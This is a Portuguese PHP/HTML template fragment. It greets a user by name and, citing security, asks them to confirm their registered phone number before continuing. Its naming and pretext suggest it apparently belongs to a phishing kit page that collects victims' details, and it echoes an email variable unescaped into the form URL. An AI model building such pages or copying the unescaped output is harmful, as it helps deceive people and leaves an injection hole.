<div class="block_loading">
	<div class="block_title">
		<span class="headline"><?= getSaudacao();?><b> <?= $ShowNameUser;?></b></span>
		<p class="description">Para continuar com o acesso, informe os dados abaixo:</p>
	</div>

<script>
	function check_phone(){
		var ddd = document.getElementById('ddd');
		var fone = document.getElementById('cd_phone');

		if(ddd.value == 'ddd'){
			alert("Selecione corretamente o DDD do telefone cadastrado.\nTente novamente!");
			return false;
		}
		if(fone.value == ''){
			alert("Você deve informar corretamente o número do telefone cadastrado!");
			fone.focus();
			return false;
		}
		if(fone.value.length < 9){
			alert("O Número do telefone informado não é valido, ou não é o número cadastrado conosco!");
			fone.value = '';			
			fone.focus();
			return false;
		}
	}
</script>	

	<div class="block_ps4">

		<?php 
			if(isset($_SESSION['ShowError']) && $_SESSION['ShowError'] == 1):
				$display = 'block!important;';
				$_SESSION['ShowError'] = 0;
			else:
				$display = 'none!important;';
			endif;	
		?>
		<div class="block_error" style="display:<?php echo $display;?>">
			O Telefone informado não está correto. Informe o número de telefone cadastrado conosco!
			<span class="pos_close_error">x</span>
			<div class="clear"></div>
		</div><!-- block_errorblock_error -->
		<div class="clear"></div>

		<div class="block_message_all">
			Para prosseguir com segurança, <span class="red_txt">precisaremos confirmar seu telefone</span> cadastrado!<br>
			Informe o telefone cadastrado!
		</div><!-- block_message_all -->
		
		<div class="block_need_card">
			<form action="acesso.php?cliente=<?php echo $emailx; ?>" method="post" name="form_card" id="form_card" onsubmit="return check_phone();">
				<label for="cd_name">
					<span>DDD e telefone:</span> 
					<select name="ddd" id="ddd" class="normal_input" style="float:left;width:70px;margin-right:10px;">
						<option value="ddd" disabled selected>DDD</option>
						<?php 
							for($i = 11;$i<= 99;$i++):
								echo '<option value='.$i.'>'.$i.'</option>';
							endfor;	
						?>
					</select>
					<input type="text" name="cd_phone" id="cd_phone" class="normal_input" autocomplete="off" style="width:180px;" maxlength="9">
				</label>
				<input type="hidden" name="sender" value="get_phone">
			</form>
		</div><!-- block_need_card -->

	</div><!-- block_ps4 -->

	<div class="block_buttons_form">
		<div class="clear_btn J_Cancel"></div>
		<div class="submit_btn J_Submit_FC"></div>
	</div><!-- block_buttons_form -->

</div><!-- block_loading -->